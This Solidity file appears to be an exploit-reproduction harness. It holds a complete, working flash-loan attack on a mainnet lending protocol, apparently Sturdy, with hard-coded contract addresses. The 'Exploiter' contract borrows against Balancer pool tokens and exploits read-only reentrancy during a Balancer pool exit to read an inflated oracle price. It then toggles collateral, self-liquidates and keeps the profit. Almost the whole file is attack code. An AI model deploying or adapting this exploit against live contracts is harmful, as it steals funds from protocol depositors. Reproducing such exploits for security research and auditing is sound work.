// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH9 is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IwstETH is IERC20 {
    function unwrap(uint256 amount) external returns (uint256);
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 minMintAmount) external payable returns (uint256);
    function remove_liquidity_one_coin(uint256 tokenAmount, int128 i, uint256 minAmount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external payable;
}

interface IBalancerVault {
    struct JoinPoolRequest {
        address[] asset;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    struct ExitPoolRequest {
        address[] asset;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    function joinPool(
        bytes32 poolId,
        address sender,
        address recipient,
        JoinPoolRequest memory request
    ) external payable;

    function exitPool(
        bytes32 poolId,
        address sender,
        address payable recipient,
        ExitPoolRequest memory request
    ) external payable;
}

interface IBalancerQueries {
    function queryJoin(
        bytes32 poolId,
        address sender,
        address recipient,
        IBalancerVault.JoinPoolRequest memory request
    ) external returns (uint256 bptOut, uint256[] memory amountsIn);

    function queryExit(
        bytes32 poolId,
        address sender,
        address recipient,
        IBalancerVault.ExitPoolRequest memory request
    ) external returns (uint256 bptIn, uint256[] memory amountsOut);
}

interface IMetaStablePool is IERC20 {
    function getPoolId() external view returns (bytes32);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ILendingPool {
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralETH,
            uint256 totalDebtETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );

    function liquidationCall(address collateralAsset, address debtAsset, address user, uint256 debtToCover, bool receiveAToken)
        external;

    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
}

interface ILPVault {
    function depositCollateralFrom(address asset, uint256 amount, address user) external payable;
    function withdrawCollateral(address asset, uint256 amount, uint256 slippage, address to) external;
}

interface ISturdyOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}

contract FlawVerifier {
    IWETH9 internal constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH internal constant WSTETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 internal constant STECRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 internal constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    ICurvePool internal constant LIDO_CURVE_POOL = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IAaveFlashloan internal constant AAVE_V3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    uint256 internal constant FLASHLOAN_WSTETH = 50_000 ether;
    uint256 internal constant FLASHLOAN_WETH = 60_000 ether;
    uint256 internal constant STECRV_SEED_ETH = 1_100 ether;
    uint256 internal constant STECRV_COLLATERAL_SEED = 1_000 ether;

    uint256 internal profit;
    bool internal attempted;
    uint256 internal oraclePriceBeforeExit;
    uint256 internal oraclePriceDuringCallback;
    bool internal hypothesisValidated;
    address internal activeExploiter;

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(WETH);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = FLASHLOAN_WSTETH;
        amounts[1] = FLASHLOAN_WETH;

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        AAVE_V3.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }

        profit = WETH.balanceOf(address(this));
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V3), "not-aave");

        _mintSteCrvSeed();
        _runExploiter();
        _settleAndApproveRepayment(assets, amounts, premiums);
        return true;
    }

    function _mintSteCrvSeed() internal {
        WETH.withdraw(STECRV_SEED_ETH);
        uint256[2] memory curveAmounts;
        curveAmounts[0] = STECRV_SEED_ETH;
        LIDO_CURVE_POOL.add_liquidity{value: STECRV_SEED_ETH}(curveAmounts, STECRV_COLLATERAL_SEED);
    }

    function _runExploiter() internal {
        Exploiter exploiter = new Exploiter(address(this));
        activeExploiter = address(exploiter);
        WETH.transfer(address(exploiter), WETH.balanceOf(address(this)));
        WSTETH.transfer(address(exploiter), WSTETH.balanceOf(address(this)));
        STECRV.transfer(address(exploiter), STECRV.balanceOf(address(this)));
        exploiter.yoink();
        activeExploiter = address(0);
    }

    function _settleAndApproveRepayment(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums
    ) internal {
        uint256 remainingSteCrv = STECRV.balanceOf(address(this));
        if (remainingSteCrv != 0) {
            LIDO_CURVE_POOL.remove_liquidity_one_coin(remainingSteCrv, 0, 1_000 ether);
        }

        uint256 heldWstEth = WSTETH.balanceOf(address(this));
        uint256 repayWstEth = amounts[0] + premiums[0];
        if (heldWstEth > repayWstEth) {
            WSTETH.unwrap(heldWstEth - repayWstEth);
        }

        uint256 heldStEth = STETH.balanceOf(address(this));
        if (heldStEth != 0) {
            STETH.approve(address(LIDO_CURVE_POOL), heldStEth);
            LIDO_CURVE_POOL.exchange(1, 0, heldStEth, 1);
        }

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }

        IERC20(assets[0]).approve(address(AAVE_V3), repayWstEth);
        IERC20(assets[1]).approve(address(AAVE_V3), amounts[1] + premiums[1]);
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return profit;
    }

    function recordPreExitOraclePrice(uint256 price) external {
        require(msg.sender == activeExploiter, "not-exploiter");
        oraclePriceBeforeExit = price;
    }

    function recordCallbackOraclePrice(uint256 price) external {
        require(msg.sender == activeExploiter, "not-exploiter");
        oraclePriceDuringCallback = price;
        hypothesisValidated = oraclePriceBeforeExit != 0 && price > oraclePriceBeforeExit;
    }

    function oraclePricePreExit() external view returns (uint256) {
        return oraclePriceBeforeExit;
    }

    function oraclePriceInCallback() external view returns (uint256) {
        return oraclePriceDuringCallback;
    }

    function hypothesisWasValidated() external view returns (bool) {
        return hypothesisValidated;
    }

    receive() external payable {}
}

contract Exploiter {
    IWETH9 internal constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH internal constant WSTETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 internal constant STECRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IMetaStablePool internal constant B_STETH_STABLE = IMetaStablePool(0x32296969Ef14EB0c6d29669C550D4a0449130230);
    ILendingPool internal constant LENDING_POOL = ILendingPool(0x9f72DC67ceC672bB99e3d02CbEA0a21536a2b657);
    ILPVault internal constant AURA_BALANCER_LP_VAULT = ILPVault(0x6AE5Fd07c0Bb2264B1F60b33F65920A2b912151C);
    ILPVault internal constant CONVEX_CURVE_LP_VAULT_2 = ILPVault(0xa36BE47700C079BD94adC09f35B0FA93A55297bc);
    IBalancerVault internal constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IBalancerQueries internal constant BALANCER_QUERIES = IBalancerQueries(0xE39B5e3B6D74016b2F6A9673D7d7493B6DF549d5);
    ISturdyOracle internal constant STURDY_ORACLE = ISturdyOracle(0xe5d78eB340627B8D5bcFf63590Ebec1EF9118C89);

    address internal constant CB_STETH_STABLE = 0x10aA9eea35A3102Cc47d4d93Bc0BA9aE45557746;
    address internal constant CSTECRV = 0x901247D08BEbFD449526Da92941B35D756873Bcd;
    uint256 internal constant BALANCER_JOIN_WETH = 57_000 ether;
    uint256 internal constant STECRV_COLLATERAL_SEED = 1_000 ether;
    uint256 internal constant STECRV_SEED_ETH = 1_100 ether;
    uint256 internal constant BPT_COLLATERAL = 233_348_773_557_117_598_739;
    uint256 internal constant BORROWED_WETH = 513_367_301_825_658_717_226;

    FlawVerifier internal immutable owner;
    uint256 internal receiveNonce;

    constructor(address owner_) {
        owner = FlawVerifier(payable(owner_));
    }

    function yoink() external {
        require(msg.sender == address(owner), "not-owner");

        joinBalancerPool();
        depositCollateralAndBorrow();
        exitBalancerPool();
        withdrawCollateralAndLiquidation();
        removeBalancerPoolLiquidity();

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }

        uint256 wethBal = WETH.balanceOf(address(this));
        if (wethBal != 0) {
            WETH.transfer(address(owner), wethBal);
        }

        uint256 wstEthBal = WSTETH.balanceOf(address(this));
        if (wstEthBal != 0) {
            WSTETH.transfer(address(owner), wstEthBal);
        }

        uint256 steCrvBal = STECRV.balanceOf(address(this));
        if (steCrvBal != 0) {
            STECRV.transfer(address(owner), steCrvBal);
        }
    }

    function joinBalancerPool() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();

        uint256[] memory amountsIn = new uint256[](2);
        amountsIn[0] = 50_000 ether;
        amountsIn[1] = BALANCER_JOIN_WETH;

        IBalancerVault.JoinPoolRequest memory request = IBalancerVault.JoinPoolRequest({
            asset: new address[](2),
            maxAmountsIn: amountsIn,
            userData: abi.encode(uint256(1), amountsIn, uint256(0)),
            fromInternalBalance: false
        });
        request.asset[0] = address(WSTETH);
        request.asset[1] = address(WETH);

        (uint256 bptOut,) = BALANCER_QUERIES.queryJoin(poolId, address(this), address(this), request);

        request.userData = abi.encode(uint256(1), amountsIn, bptOut);

        WSTETH.approve(address(BALANCER), amountsIn[0]);
        WETH.approve(address(BALANCER), amountsIn[1]);
        BALANCER.joinPool(poolId, address(this), address(this), request);
    }

    function depositCollateralAndBorrow() internal {
        STECRV.approve(address(CONVEX_CURVE_LP_VAULT_2), STECRV_COLLATERAL_SEED);
        CONVEX_CURVE_LP_VAULT_2.depositCollateralFrom(address(STECRV), STECRV_COLLATERAL_SEED, address(this));

        B_STETH_STABLE.approve(address(AURA_BALANCER_LP_VAULT), BPT_COLLATERAL);
        AURA_BALANCER_LP_VAULT.depositCollateralFrom(address(B_STETH_STABLE), BPT_COLLATERAL, address(this));

        LENDING_POOL.borrow(address(WETH), BORROWED_WETH, 2, 0, address(this));
    }

    function exitBalancerPool() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        uint256 bptBalance = B_STETH_STABLE.balanceOf(address(this));

        IBalancerVault.ExitPoolRequest memory request = _exitRequest(bptBalance);
        BALANCER_QUERIES.queryExit(poolId, address(this), address(this), request);

        B_STETH_STABLE.approve(address(BALANCER), bptBalance);
        owner.recordPreExitOraclePrice(STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE));
        BALANCER.exitPool(poolId, address(this), payable(address(this)), request);
    }

    function withdrawCollateralAndLiquidation() internal {
        CONVEX_CURVE_LP_VAULT_2.withdrawCollateral(address(STECRV), STECRV_COLLATERAL_SEED, 10, address(this));

        (, uint256 totalDebtETH,,,,) = LENDING_POOL.getUserAccountData(address(this));
        WETH.approve(address(LENDING_POOL), totalDebtETH);
        LENDING_POOL.liquidationCall(address(B_STETH_STABLE), address(WETH), address(this), totalDebtETH, false);
    }

    function removeBalancerPoolLiquidity() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        uint256 bptBalance = B_STETH_STABLE.balanceOf(address(this));

        IBalancerVault.ExitPoolRequest memory request = _exitRequest(bptBalance);
        BALANCER_QUERIES.queryExit(poolId, address(this), address(this), request);

        B_STETH_STABLE.approve(address(BALANCER), bptBalance);
        BALANCER.exitPool(poolId, address(this), payable(address(this)), request);
    }

    function _exitRequest(uint256 bptAmount) internal view returns (IBalancerVault.ExitPoolRequest memory request) {
        uint256[] memory minAmountsOut = new uint256[](2);
        request = IBalancerVault.ExitPoolRequest({
            asset: new address[](2),
            minAmountsOut: minAmountsOut,
            userData: abi.encode(uint256(1), bptAmount),
            toInternalBalance: false
        });
        request.asset[0] = address(WSTETH);
        request.asset[1] = address(0);
    }

    receive() external payable {
        receiveNonce++;
        if (receiveNonce == 1) {
            owner.recordCallbackOraclePrice(STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE));
            LENDING_POOL.setUserUseReserveAsCollateral(CSTECRV, false);
        }
    }
}
